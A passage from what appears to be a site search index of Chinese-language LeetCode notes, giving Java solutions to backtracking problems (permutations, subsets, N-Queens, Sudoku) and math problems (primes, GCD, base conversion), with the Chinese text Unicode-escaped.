Output: ["ad", "ae", "af", "bd", "be", "bf", "cd", "ce", "cf"].
private static final String[] KEYS = {"", "", "abc", "def", "ghi", "jkl", "mno", "pqrs", "tuv", "wxyz"}; public List<String> letterCombinations(String digits) { List<String> combinations = new ArrayList<>(); if (digits == null || digits.length() == 0) { return combinations; } doCombination(new StringBuilder(), combinations, digits); return combinations;
} private void doCombination(StringBuilder prefix, List<String> combinations, final String digits) { if (prefix.length() == digits.length()) { combinations.add(prefix.toString()); return; } int curDigits = digits.charAt(prefix.length()) - '0'; String letters = KEYS[curDigits]; for (char c : letters.toCharArray()) { prefix.append(c); // \u6DFB\u52A0 doCombination(prefix, combinations, digits); prefix.deleteCharAt(prefix.length() - 1); // \u5220\u9664 }
}`},{header:"2. IP \u5730\u5740\u5212\u5206",slug:"_2-ip-\u5730\u5740\u5212\u5206",content:`93. Restore IP Addresses(Medium)
Leetcode / \u529B\u6263
Given "25525511135",
return ["255.255.11.135", "255.255.111.35"].
public List<String> restoreIpAddresses(String s) { List<String> addresses = new ArrayList<>(); StringBuilder tempAddress = new StringBuilder(); doRestore(0, tempAddress, addresses, s); return addresses;
} private void doRestore(int k, StringBuilder tempAddress, List<String> addresses, String s) { if (k == 4 || s.length() == 0) { if (k == 4 && s.length() == 0) { addresses.add(tempAddress.toString()); } return; } for (int i = 0; i < s.length() && i <= 2; i++) { if (i != 0 && s.charAt(0) == '0') { break; } String part = s.substring(0, i + 1); if (Integer.valueOf(part) <= 255) { if (tempAddress.length() != 0) { part = "." + part; } tempAddress.append(part); doRestore(k + 1, tempAddress, addresses, s.substring(i + 1)); tempAddress.delete(tempAddress.length() - part.length(), tempAddress.length()); } }
}`},{header:"3. \u5728\u77E9\u9635\u4E2D\u5BFB\u627E\u5B57\u7B26\u4E32",slug:"_3-\u5728\u77E9\u9635\u4E2D\u5BFB\u627E\u5B57\u7B26\u4E32",content:`79. Word Search (Medium)
Leetcode / \u529B\u6263
For example,
Given board =
[ ['A','B','C','E'], ['S','F','C','S'], ['A','D','E','E']
]
word = "ABCCED", -> returns true,
word = "SEE", -> returns true,
word = "ABCB", -> returns false.
private final static int[][] direction = {{1, 0}, {-1, 0}, {0, 1}, {0, -1}};
private int m;
private int n; public boolean exist(char[][] board, String word) { if (word == null || word.length() == 0) { return true; } if (board == null || board.length == 0 || board[0].length == 0) { return false; } m = board.length; n = board[0].length; boolean[][] hasVisited = new boolean[m][n]; for (int r = 0; r < m; r++) { for (int c = 0; c < n; c++) { if (backtracking(0, r, c, hasVisited, board, word)) { return true; } } } return false;
} private boolean backtracking(int curLen, int r, int c, boolean[][] visited, final char[][] board, final String word) { if (curLen == word.length()) { return true; } if (r < 0 || r >= m || c < 0 || c >= n || board[r][c] != word.charAt(curLen) || visited[r][c]) { return false; } visited[r][c] = true; for (int[] d : direction) { if (backtracking(curLen + 1, r + d[0], c + d[1], visited, board, word)) { return true; } } visited[r][c] = false; return false;
}`},{header:"4. \u8F93\u51FA\u4E8C\u53C9\u6811\u4E2D\u6240\u6709\u4ECE\u6839\u5230\u53F6\u5B50\u7684\u8DEF\u5F84",slug:"_4-\u8F93\u51FA\u4E8C\u53C9\u6811\u4E2D\u6240\u6709\u4ECE\u6839\u5230\u53F6\u5B50\u7684\u8DEF\u5F84",content:`257. Binary Tree Paths (Easy)
Leetcode / \u529B\u6263 1 / \\
2 3 \\ 5
["1->2->5", "1->3"] public List<String> binaryTreePaths(TreeNode root) { List<String> paths = new ArrayList<>(); if (root == null) { return paths; } List<Integer> values = new ArrayList<>(); backtracking(root, values, paths); return paths;
} private void backtracking(TreeNode node, List<Integer> values, List<String> paths) { if (node == null) { return; } values.add(node.val); if (isLeaf(node)) { paths.add(buildPath(values)); } else { backtracking(node.left, values, paths); backtracking(node.right, values, paths); } values.remove(values.size() - 1);
} private boolean isLeaf(TreeNode node) { return node.left == null && node.right == null;
} private String buildPath(List<Integer> values) { StringBuilder str = new StringBuilder(); for (int i = 0; i < values.size(); i++) { str.append(values.get(i)); if (i != values.size() - 1) { str.append("->"); } } return str.toString();
}`},{header:"5. \u6392\u5217",slug:"_5-\u6392\u5217",content:`46. Permutations (Medium)
Leetcode / \u529B\u6263
[1,2,3] have the following permutations:
[ [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], [3,2,1]
]
public List<List<Integer>> permute(int[] nums) { List<List<Integer>> permutes = new ArrayList<>(); List<Integer> permuteList = new ArrayList<>(); boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes;
} private void backtracking(List<Integer> permuteList, List<List<Integer>> permutes, boolean[] visited, final int[] nums) { if (permuteList.size() == nums.length) { permutes.add(new ArrayList<>(permuteList)); // \u91CD\u65B0\u6784\u9020\u4E00\u4E2A List return; } for (int i = 0; i < visited.length; i++) { if (visited[i]) { continue; } visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; }
}`},{header:"6. \u542B\u6709\u76F8\u540C\u5143\u7D20\u6C42\u6392\u5217",slug:"_6-\u542B\u6709\u76F8\u540C\u5143\u7D20\u6C42\u6392\u5217",content:`47. Permutations II (Medium)
Leetcode / \u529B\u6263
[1,1,2] have the following unique permutations:
[[1,1,2], [1,2,1], [2,1,1]]
\u6570\u7EC4\u5143\u7D20\u53EF\u80FD\u542B\u6709\u76F8\u540C\u7684\u5143\u7D20\uFF0C\u8FDB\u884C\u6392\u5217\u65F6\u5C31\u6709\u53EF\u80FD\u51FA\u73B0\u91CD\u590D\u7684\u6392\u5217\uFF0C\u8981\u6C42\u91CD\u590D\u7684\u6392\u5217\u53EA\u8FD4\u56DE\u4E00\u4E2A\u3002
\u5728\u5B9E\u73B0\u4E0A\uFF0C\u548C Permutations \u4E0D\u540C\u7684\u662F\u8981\u5148\u6392\u5E8F\uFF0C\u7136\u540E\u5728\u6DFB\u52A0\u4E00\u4E2A\u5143\u7D20\u65F6\uFF0C\u5224\u65AD\u8FD9\u4E2A\u5143\u7D20\u662F\u5426\u7B49\u4E8E\u524D\u4E00\u4E2A\u5143\u7D20\uFF0C\u5982\u679C\u7B49\u4E8E\uFF0C\u5E76\u4E14\u524D\u4E00\u4E2A\u5143\u7D20\u8FD8\u672A\u8BBF\u95EE\uFF0C\u90A3\u4E48\u5C31\u8DF3\u8FC7\u8FD9\u4E2A\u5143\u7D20\u3002
public List<List<Integer>> permuteUnique(int[] nums) { List<List<Integer>> permutes = new ArrayList<>(); List<Integer> permuteList = new ArrayList<>(); Arrays.sort(nums); // \u6392\u5E8F boolean[] hasVisited = new boolean[nums.length]; backtracking(permuteList, permutes, hasVisited, nums); return permutes;
} private void backtracking(List<Integer> permuteList, List<List<Integer>> permutes, boolean[] visited, final int[] nums) { if (permuteList.size() == nums.length) { permutes.add(new ArrayList<>(permuteList)); return; } for (int i = 0; i < visited.length; i++) { if (i != 0 && nums[i] == nums[i - 1] && !visited[i - 1]) { continue; // \u9632\u6B62\u91CD\u590D } if (visited[i]){ continue; } visited[i] = true; permuteList.add(nums[i]); backtracking(permuteList, permutes, visited, nums); permuteList.remove(permuteList.size() - 1); visited[i] = false; }
}`},{header:"7. \u7EC4\u5408",slug:"_7-\u7EC4\u5408",content:`77. Combinations (Medium)
Leetcode / \u529B\u6263
If n = 4 and k = 2, a solution is:
[ [2,4], [3,4], [2,3], [1,2], [1,3], [1,4],
]
public List<List<Integer>> combine(int n, int k) { List<List<Integer>> combinations = new ArrayList<>(); List<Integer> combineList = new ArrayList<>(); backtracking(combineList, combinations, 1, k, n); return combinations;
} private void backtracking(List<Integer> combineList, List<List<Integer>> combinations, int start, int k, final int n) { if (k == 0) { combinations.add(new ArrayList<>(combineList)); return; } for (int i = start; i <= n - k + 1; i++) { // \u526A\u679D combineList.add(i); backtracking(combineList, combinations, i + 1, k - 1, n); combineList.remove(combineList.size() - 1); }
}`},{header:"8. \u7EC4\u5408\u6C42\u548C",slug:"_8-\u7EC4\u5408\u6C42\u548C",content:`39. Combination Sum (Medium)
Leetcode / \u529B\u6263
given candidate set [2, 3, 6, 7] and target 7,
A solution set is:
[[7],[2, 2, 3]]
public List<List<Integer>> combinationSum(int[] candidates, int target) { List<List<Integer>> combinations = new ArrayList<>(); backtracking(new ArrayList<>(), combinations, 0, target, candidates); return combinations;
} private void backtracking(List<Integer> tempCombination, List<List<Integer>> combinations, int start, int target, final int[] candidates) { if (target == 0) { combinations.add(new ArrayList<>(tempCombination)); return; } for (int i = start; i < candidates.length; i++) { if (candidates[i] <= target) { tempCombination.add(candidates[i]); backtracking(tempCombination, combinations, i, target - candidates[i], candidates); tempCombination.remove(tempCombination.size() - 1); } }
}`},{header:"9. \u542B\u6709\u76F8\u540C\u5143\u7D20\u7684\u7EC4\u5408\u6C42\u548C",slug:"_9-\u542B\u6709\u76F8\u540C\u5143\u7D20\u7684\u7EC4\u5408\u6C42\u548C",content:`40. Combination Sum II (Medium)
Leetcode / \u529B\u6263
For example, given candidate set [10, 1, 2, 7, 6, 1, 5] and target 8,
A solution set is:
[ [1, 7], [1, 2, 5], [2, 6], [1, 1, 6]
]
public List<List<Integer>> combinationSum2(int[] candidates, int target) { List<List<Integer>> combinations = new ArrayList<>(); Arrays.sort(candidates); backtracking(new ArrayList<>(), combinations, new boolean[candidates.length], 0, target, candidates); return combinations;
} private void backtracking(List<Integer> tempCombination, List<List<Integer>> combinations, boolean[] hasVisited, int start, int target, final int[] candidates) { if (target == 0) { combinations.add(new ArrayList<>(tempCombination)); return; } for (int i = start; i < candidates.length; i++) { if (i != 0 && candidates[i] == candidates[i - 1] && !hasVisited[i - 1]) { continue; } if (candidates[i] <= target) { tempCombination.add(candidates[i]); hasVisited[i] = true; backtracking(tempCombination, combinations, hasVisited, i + 1, target - candidates[i], candidates); hasVisited[i] = false; tempCombination.remove(tempCombination.size() - 1); } }
}`},{header:"10. 1-9 \u6570\u5B57\u7684\u7EC4\u5408\u6C42\u548C",slug:"_10-1-9-\u6570\u5B57\u7684\u7EC4\u5408\u6C42\u548C",content:`216. Combination Sum III (Medium)
Leetcode / \u529B\u6263
Input: k = 3, n = 9 Output: [[1,2,6], [1,3,5], [2,3,4]]
\u4ECE 1-9 \u6570\u5B57\u4E2D\u9009\u51FA k \u4E2A\u6570\u4E0D\u91CD\u590D\u7684\u6570\uFF0C\u4F7F\u5F97\u5B83\u4EEC\u7684\u548C\u4E3A n\u3002
public List<List<Integer>> combinationSum3(int k, int n) { List<List<Integer>> combinations = new ArrayList<>(); List<Integer> path = new ArrayList<>(); backtracking(k, n, 1, path, combinations); return combinations;
} private void backtracking(int k, int n, int start, List<Integer> tempCombination, List<List<Integer>> combinations) { if (k == 0 && n == 0) { combinations.add(new ArrayList<>(tempCombination)); return; } if (k == 0 || n == 0) { return; } for (int i = start; i <= 9; i++) { tempCombination.add(i); backtracking(k - 1, n - i, i + 1, tempCombination, combinations); tempCombination.remove(tempCombination.size() - 1); }
}`},{header:"11. \u5B50\u96C6",slug:"_11-\u5B50\u96C6",content:`78. Subsets (Medium)
Leetcode / \u529B\u6263
\u627E\u51FA\u96C6\u5408\u7684\u6240\u6709\u5B50\u96C6\uFF0C\u5B50\u96C6\u4E0D\u80FD\u91CD\u590D\uFF0C[1, 2] \u548C [2, 1] \u8FD9\u79CD\u5B50\u96C6\u7B97\u91CD\u590D
public List<List<Integer>> subsets(int[] nums) { List<List<Integer>> subsets = new ArrayList<>(); List<Integer> tempSubset = new ArrayList<>(); for (int size = 0; size <= nums.length; size++) { backtracking(0, tempSubset, subsets, size, nums); // \u4E0D\u540C\u7684\u5B50\u96C6\u5927\u5C0F } return subsets;
} private void backtracking(int start, List<Integer> tempSubset, List<List<Integer>> subsets, final int size, final int[] nums) { if (tempSubset.size() == size) { subsets.add(new ArrayList<>(tempSubset)); return; } for (int i = start; i < nums.length; i++) { tempSubset.add(nums[i]); backtracking(i + 1, tempSubset, subsets, size, nums); tempSubset.remove(tempSubset.size() - 1); }
}`},{header:"12. \u542B\u6709\u76F8\u540C\u5143\u7D20\u6C42\u5B50\u96C6",slug:"_12-\u542B\u6709\u76F8\u540C\u5143\u7D20\u6C42\u5B50\u96C6",content:`90. Subsets II (Medium)
Leetcode / \u529B\u6263
For example,
If nums = [1,2,2], a solution is: [ [2], [1], [1,2,2], [2,2], [1,2], []
]
public List<List<Integer>> subsetsWithDup(int[] nums) { Arrays.sort(nums); List<List<Integer>> subsets = new ArrayList<>(); List<Integer> tempSubset = new ArrayList<>(); boolean[] hasVisited = new boolean[nums.length]; for (int size = 0; size <= nums.length; size++) { backtracking(0, tempSubset, subsets, hasVisited, size, nums); // \u4E0D\u540C\u7684\u5B50\u96C6\u5927\u5C0F } return subsets;
} private void backtracking(int start, List<Integer> tempSubset, List<List<Integer>> subsets, boolean[] hasVisited, final int size, final int[] nums) { if (tempSubset.size() == size) { subsets.add(new ArrayList<>(tempSubset)); return; } for (int i = start; i < nums.length; i++) { if (i != 0 && nums[i] == nums[i - 1] && !hasVisited[i - 1]) { continue; } tempSubset.add(nums[i]); hasVisited[i] = true; backtracking(i + 1, tempSubset, subsets, hasVisited, size, nums); hasVisited[i] = false; tempSubset.remove(tempSubset.size() - 1); }
}`},{header:"13. \u5206\u5272\u5B57\u7B26\u4E32\u4F7F\u5F97\u6BCF\u4E2A\u90E8\u5206\u90FD\u662F\u56DE\u6587\u6570",slug:"_13-\u5206\u5272\u5B57\u7B26\u4E32\u4F7F\u5F97\u6BCF\u4E2A\u90E8\u5206\u90FD\u662F\u56DE\u6587\u6570",content:`131. Palindrome Partitioning (Medium)
Leetcode / \u529B\u6263
For example, given s = "aab",
Return [ ["aa","b"], ["a","a","b"]
]
public List<List<String>> partition(String s) { List<List<String>> partitions = new ArrayList<>(); List<String> tempPartition = new ArrayList<>(); doPartition(s, partitions, tempPartition); return partitions;
} private void doPartition(String s, List<List<String>> partitions, List<String> tempPartition) { if (s.length() == 0) { partitions.add(new ArrayList<>(tempPartition)); return; } for (int i = 0; i < s.length(); i++) { if (isPalindrome(s, 0, i)) { tempPartition.add(s.substring(0, i + 1)); doPartition(s.substring(i + 1), partitions, tempPartition); tempPartition.remove(tempPartition.size() - 1); } }
} private boolean isPalindrome(String s, int begin, int end) { while (begin < end) { if (s.charAt(begin++) != s.charAt(end--)) { return false; } } return true;
}`},{header:"14. \u6570\u72EC",slug:"_14-\u6570\u72EC",content:`37. Sudoku Solver (Hard)
Leetcode / \u529B\u6263 private boolean[][] rowsUsed = new boolean[9][10];
private boolean[][] colsUsed = new boolean[9][10];
private boolean[][] cubesUsed = new boolean[9][10];
private char[][] board; public void solveSudoku(char[][] board) { this.board = board; for (int i = 0; i < 9; i++) for (int j = 0; j < 9; j++) { if (board[i][j] == '.') { continue; } int num = board[i][j] - '0'; rowsUsed[i][num] = true; colsUsed[j][num] = true; cubesUsed[cubeNum(i, j)][num] = true; } backtracking(0, 0);
} private boolean backtracking(int row, int col) { while (row < 9 && board[row][col] != '.') { row = col == 8 ? row + 1 : row; col = col == 8 ? 0 : col + 1; } if (row == 9) { return true; } for (int num = 1; num <= 9; num++) { if (rowsUsed[row][num] || colsUsed[col][num] || cubesUsed[cubeNum(row, col)][num]) { continue; } rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = true; board[row][col] = (char) (num + '0'); if (backtracking(row, col)) { return true; } board[row][col] = '.'; rowsUsed[row][num] = colsUsed[col][num] = cubesUsed[cubeNum(row, col)][num] = false; } return false;
} private int cubeNum(int i, int j) { int r = i / 3; int c = j / 3; return r * 3 + c;
}`},{header:"15. N \u7687\u540E",slug:"_15-n-\u7687\u540E",content:`51. N-Queens (Hard)
Leetcode / \u529B\u6263 \u5728 n*n \u7684\u77E9\u9635\u4E2D\u6446\u653E n \u4E2A\u7687\u540E\uFF0C\u5E76\u4E14\u6BCF\u4E2A\u7687\u540E\u4E0D\u80FD\u5728\u540C\u4E00\u884C\uFF0C\u540C\u4E00\u5217\uFF0C\u540C\u4E00\u5BF9\u89D2\u7EBF\u4E0A\uFF0C\u6C42\u6240\u6709\u7684 n \u7687\u540E\u7684\u89E3\u3002
\u4E00\u884C\u4E00\u884C\u5730\u6446\u653E\uFF0C\u5728\u786E\u5B9A\u4E00\u884C\u4E2D\u7684\u90A3\u4E2A\u7687\u540E\u5E94\u8BE5\u6446\u5728\u54EA\u4E00\u5217\u65F6\uFF0C\u9700\u8981\u7528\u4E09\u4E2A\u6807\u8BB0\u6570\u7EC4\u6765\u786E\u5B9A\u67D0\u4E00\u5217\u662F\u5426\u5408\u6CD5\uFF0C\u8FD9\u4E09\u4E2A\u6807\u8BB0\u6570\u7EC4\u5206\u522B\u4E3A\uFF1A\u5217\u6807\u8BB0\u6570\u7EC4\u300145 \u5EA6\u5BF9\u89D2\u7EBF\u6807\u8BB0\u6570\u7EC4\u548C 135 \u5EA6\u5BF9\u89D2\u7EBF\u6807\u8BB0\u6570\u7EC4\u3002
45 \u5EA6\u5BF9\u89D2\u7EBF\u6807\u8BB0\u6570\u7EC4\u7684\u957F\u5EA6\u4E3A 2 * n - 1\uFF0C\u901A\u8FC7\u4E0B\u56FE\u53EF\u4EE5\u660E\u786E (r, c) \u7684\u4F4D\u7F6E\u6240\u5728\u7684\u6570\u7EC4\u4E0B\u6807\u4E3A r + c\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9c422923-1447-4a3b-a4e1-97e663738187.jpg" width="300px">
135 \u5EA6\u5BF9\u89D2\u7EBF\u6807\u8BB0\u6570\u7EC4\u7684\u957F\u5EA6\u4E5F\u662F 2 * n - 1\uFF0C(r, c) \u7684\u4F4D\u7F6E\u6240\u5728\u7684\u6570\u7EC4\u4E0B\u6807\u4E3A n - 1 - (r - c)\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7a85e285-e152-4116-b6dc-3fab27ba9437.jpg" width="300px">
private List<List<String>> solutions;
private char[][] nQueens;
private boolean[] colUsed;
private boolean[] diagonals45Used;
private boolean[] diagonals135Used;
private int n; public List<List<String>> solveNQueens(int n) { solutions = new ArrayList<>(); nQueens = new char[n][n]; for (int i = 0; i < n; i++) { Arrays.fill(nQueens[i], '.'); } colUsed = new boolean[n]; diagonals45Used = new boolean[2 * n - 1]; diagonals135Used = new boolean[2 * n - 1]; this.n = n; backtracking(0); return solutions;
} private void backtracking(int row) { if (row == n) { List<String> list = new ArrayList<>(); for (char[] chars : nQueens) { list.add(new String(chars)); } solutions.add(list); return; } for (int col = 0; col < n; col++) { int diagonals45Idx = row + col; int diagonals135Idx = n - 1 - (row - col); if (colUsed[col] || diagonals45Used[diagonals45Idx] || diagonals135Used[diagonals135Idx]) { continue; } nQueens[row][col] = 'Q'; colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = true; backtracking(row + 1); colUsed[col] = diagonals45Used[diagonals45Idx] = diagonals135Used[diagonals135Idx] = false; nQueens[row][col] = '.'; }
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E5%AD%A6.html",title:"Leetcode \u9898\u89E3 - \u6570\u5B66",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u6570\u5B66",slug:"leetcode-\u9898\u89E3-\u6570\u5B66",content:`Leetcode \u9898\u89E3 - \u6570\u5B66 \u7D20\u6570\u5206\u89E3
\u6574\u9664
\u6700\u5927\u516C\u7EA6\u6570\u6700\u5C0F\u516C\u500D\u6570 1. \u751F\u6210\u7D20\u6570\u5E8F\u5217
2. \u6700\u5927\u516C\u7EA6\u6570
3. \u4F7F\u7528\u4F4D\u64CD\u4F5C\u548C\u51CF\u6CD5\u6C42\u89E3\u6700\u5927\u516C\u7EA6\u6570 \u8FDB\u5236\u8F6C\u6362 1. 7 \u8FDB\u5236
2. 16 \u8FDB\u5236
3. 26 \u8FDB\u5236 \u9636\u4E58 1. \u7EDF\u8BA1\u9636\u4E58\u5C3E\u90E8\u6709\u591A\u5C11\u4E2A 0 \u5B57\u7B26\u4E32\u52A0\u6CD5\u51CF\u6CD5 1. \u4E8C\u8FDB\u5236\u52A0\u6CD5
2. \u5B57\u7B26\u4E32\u52A0\u6CD5 \u76F8\u9047\u95EE\u9898 1. \u6539\u53D8\u6570\u7EC4\u5143\u7D20\u4F7F\u6240\u6709\u7684\u6570\u7EC4\u5143\u7D20\u90FD\u76F8\u7B49 \u591A\u6570\u6295\u7968\u95EE\u9898 1. \u6570\u7EC4\u4E2D\u51FA\u73B0\u6B21\u6570\u591A\u4E8E n / 2 \u7684\u5143\u7D20 \u5176\u5B83 1. \u5E73\u65B9\u6570
2. 3 \u7684 n \u6B21\u65B9
3. \u4E58\u79EF\u6570\u7EC4
4. \u627E\u51FA\u6570\u7EC4\u4E2D\u7684\u4E58\u79EF\u6700\u5927\u7684\u4E09\u4E2A\u6570`},{header:"\u7D20\u6570\u5206\u89E3",slug:"\u7D20\u6570\u5206\u89E3",content:"\u6BCF\u4E00\u4E2A\u6570\u90FD\u53EF\u4EE5\u5206\u89E3\u6210\u7D20\u6570\u7684\u4E58\u79EF\uFF0C\u4F8B\u5982 84 = 22 * 31 * 50 * 71 * 110 * 130 * 170 * \u2026"},{header:"\u6574\u9664",slug:"\u6574\u9664",content:`\u4EE4 x = 2m0 * 3m1 * 5m2 * 7m3 * 11m4 * \u2026
\u4EE4 y = 2n0 * 3n1 * 5n2 * 7n3 * 11n4 * \u2026
\u5982\u679C x \u6574\u9664 y\uFF08y mod x == 0\uFF09\uFF0C\u5219\u5BF9\u4E8E\u6240\u6709 i\uFF0Cmi <= ni\u3002`},{header:"\u6700\u5927\u516C\u7EA6\u6570\u6700\u5C0F\u516C\u500D\u6570",slug:"\u6700\u5927\u516C\u7EA6\u6570\u6700\u5C0F\u516C\u500D\u6570",content:`x \u548C y \u7684\u6700\u5927\u516C\u7EA6\u6570\u4E3A\uFF1Agcd(x,y) = 2min(m0,n0) * 3min(m1,n1) * 5min(m2,n2) * ...
x \u548C y \u7684\u6700\u5C0F\u516C\u500D\u6570\u4E3A\uFF1Alcm(x,y) = 2max(m0,n0) * 3max(m1,n1) * 5max(m2,n2) * ...`},{header:"1. \u751F\u6210\u7D20\u6570\u5E8F\u5217",slug:"_1-\u751F\u6210\u7D20\u6570\u5E8F\u5217",content:`204. Count Primes (Easy)
Leetcode / \u529B\u6263
\u57C3\u62C9\u6258\u65AF\u7279\u5C3C\u7B5B\u6CD5\u5728\u6BCF\u6B21\u627E\u5230\u4E00\u4E2A\u7D20\u6570\u65F6\uFF0C\u5C06\u80FD\u88AB\u7D20\u6570\u6574\u9664\u7684\u6570\u6392\u9664\u6389\u3002
public int countPrimes(int n) { boolean[] notPrimes = new boolean[n + 1]; int count = 0; for (int i = 2; i < n; i++) { if (notPrimes[i]) { continue; } count++; // \u4ECE i * i \u5F00\u59CB\uFF0C\u56E0\u4E3A\u5982\u679C k < i\uFF0C\u90A3\u4E48 k * i \u5728\u4E4B\u524D\u5C31\u5DF2\u7ECF\u88AB\u53BB\u9664\u8FC7\u4E86 for (long j = (long) (i) * i; j < n; j += i) { notPrimes[(int) j] = true; } } return count;
}`},{header:"2. \u6700\u5927\u516C\u7EA6\u6570",slug:"_2-\u6700\u5927\u516C\u7EA6\u6570",content:`int gcd(int a, int b) { return b == 0 ? a : gcd(b, a % b);
}
\u6700\u5C0F\u516C\u500D\u6570\u4E3A\u4E24\u6570\u7684\u4E58\u79EF\u9664\u4EE5\u6700\u5927\u516C\u7EA6\u6570\u3002
int lcm(int a, int b) { return a * b / gcd(a, b);
}`},{header:"3. \u4F7F\u7528\u4F4D\u64CD\u4F5C\u548C\u51CF\u6CD5\u6C42\u89E3\u6700\u5927\u516C\u7EA6\u6570",slug:"_3-\u4F7F\u7528\u4F4D\u64CD\u4F5C\u548C\u51CF\u6CD5\u6C42\u89E3\u6700\u5927\u516C\u7EA6\u6570",content:`\u7F16\u7A0B\u4E4B\u7F8E\uFF1A2.7
\u5BF9\u4E8E a \u548C b \u7684\u6700\u5927\u516C\u7EA6\u6570 f(a, b)\uFF0C\u6709\uFF1A \u5982\u679C a \u548C b \u5747\u4E3A\u5076\u6570\uFF0Cf(a, b) = 2*f(a/2, b/2);
\u5982\u679C a \u662F\u5076\u6570 b \u662F\u5947\u6570\uFF0Cf(a, b) = f(a/2, b);
\u5982\u679C b \u662F\u5076\u6570 a \u662F\u5947\u6570\uFF0Cf(a, b) = f(a, b/2);
\u5982\u679C a \u548C b \u5747\u4E3A\u5947\u6570\uFF0Cf(a, b) = f(b, a-b); \u4E58 2 \u548C\u9664 2 \u90FD\u53EF\u4EE5\u8F6C\u6362\u4E3A\u79FB\u4F4D\u64CD\u4F5C\u3002
public int gcd(int a, int b) { if (a < b) { return gcd(b, a); } if (b == 0) { return a; } boolean isAEven = isEven(a), isBEven = isEven(b); if (isAEven && isBEven) { return 2 * gcd(a >> 1, b >> 1); } else if (isAEven && !isBEven) { return gcd(a >> 1, b); } else if (!isAEven && isBEven) { return gcd(a, b >> 1); } else { return gcd(b, a - b); }
}`},{header:"\u8FDB\u5236\u8F6C\u6362",slug:"\u8FDB\u5236\u8F6C\u6362",content:""},{header:"1. 7 \u8FDB\u5236",slug:"_1-7-\u8FDB\u5236",content:`504. Base 7 (Easy)
Leetcode / \u529B\u6263
public String convertToBase7(int num) { if (num == 0) { return "0"; } StringBuilder sb = new StringBuilder(); boolean isNegative = num < 0; if (isNegative) { num = -num; } while (num > 0) { sb.append(num % 7); num /= 7; } String ret = sb.reverse().toString(); return isNegative ? "-" + ret : ret;
}
Java \u4E2D static String toString(int num, int radix) \u53EF\u4EE5\u5C06\u4E00\u4E2A\u6574\u6570\u8F6C\u6362\u4E3A radix \u8FDB\u5236\u8868\u793A\u7684\u5B57\u7B26\u4E32\u3002
public String convertToBase7(int num) { return Integer.toString(num, 7);
}`},{header:"2. 16 \u8FDB\u5236",slug:"_2-16-\u8FDB\u5236",content:`405. Convert a Number to Hexadecimal (Easy)
Leetcode / \u529B\u6263
Input:
26 Output:
"1a" Input:
-1 Output:
"ffffffff"
\u8D1F\u6570\u8981\u7528\u5B83\u7684\u8865\u7801\u5F62\u5F0F\u3002
public String toHex(int num) { char[] map = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'}; if (num == 0) return "0"; StringBuilder sb = new StringBuilder(); while (num != 0) { sb.append(map[num & 0b1111]); num >>>= 4; // \u56E0\u4E3A\u8003\u8651\u7684\u662F\u8865\u7801\u5F62\u5F0F\uFF0C\u56E0\u6B64\u7B26\u53F7\u4F4D\u5C31\u4E0D\u80FD\u6709\u7279\u6B8A\u7684\u610F\u4E49\uFF0C\u9700\u8981\u4F7F\u7528\u65E0\u7B26\u53F7\u53F3\u79FB\uFF0C\u5DE6\u8FB9\u586B 0 } return sb.reverse().toString();
}`},{header:"3. 26 \u8FDB\u5236",slug:"_3-26-\u8FDB\u5236",content:`168. Excel Sheet Column Title (Easy)
Leetcode / \u529B\u6263
1 -> A
2 -> B
3 -> C
...
26 -> Z
27 -> AA
28 -> AB
\u56E0\u4E3A\u662F\u4ECE 1 \u5F00\u59CB\u8BA1\u7B97\u7684\uFF0C\u800C\u4E0D\u662F\u4ECE 0 \u5F00\u59CB\uFF0C\u56E0\u6B64\u9700\u8981\u5BF9 n \u6267\u884C -1 \u64CD\u4F5C\u3002
public String convertToTitle(int n) { if (n == 0) { return ""; } n--; return convertToTitle(n / 26) + (char) (n % 26 + 'A');
}`},{header:"\u9636\u4E58",slug:"\u9636\u4E58",content:""},{header:"1. \u7EDF\u8BA1\u9636\u4E58\u5C3E\u90E8\u6709\u591A\u5C11\u4E2A 0",slug:"_1-\u7EDF\u8BA1\u9636\u4E58\u5C3E\u90E8\u6709\u591A\u5C11\u4E2A-0",content:`172. Factorial Trailing Zeroes (Easy)
Leetcode / \u529B\u6263
\u5C3E\u90E8\u7684 0 \u7531 2 * 5 \u5F97\u6765\uFF0C2 \u7684\u6570\u91CF\u660E\u663E\u591A\u4E8E 5 \u7684\u6570\u91CF\uFF0C\u56E0\u6B64\u53EA\u8981\u7EDF\u8BA1\u6709\u591A\u5C11\u4E2A 5 \u5373\u53EF\u3002
\u5BF9\u4E8E\u4E00\u4E2A\u6570 N\uFF0C\u5B83\u6240\u5305\u542B 5 \u7684\u4E2A\u6570\u4E3A\uFF1AN/5 + N/52 + N/53 + ...\uFF0C\u5176\u4E2D N/5 \u8868\u793A\u4E0D\u5927\u4E8E N \u7684\u6570\u4E2D 5 \u7684\u500D\u6570\u8D21\u732E\u4E00\u4E2A 5\uFF0CN/52 \u8868\u793A\u4E0D\u5927\u4E8E N \u7684\u6570\u4E2D 52 \u7684\u500D\u6570\u518D\u8D21\u732E\u4E00\u4E2A 5 ...\u3002
public int trailingZeroes(int n) { return n == 0 ? 0 : n / 5 + trailingZeroes(n / 5);
}
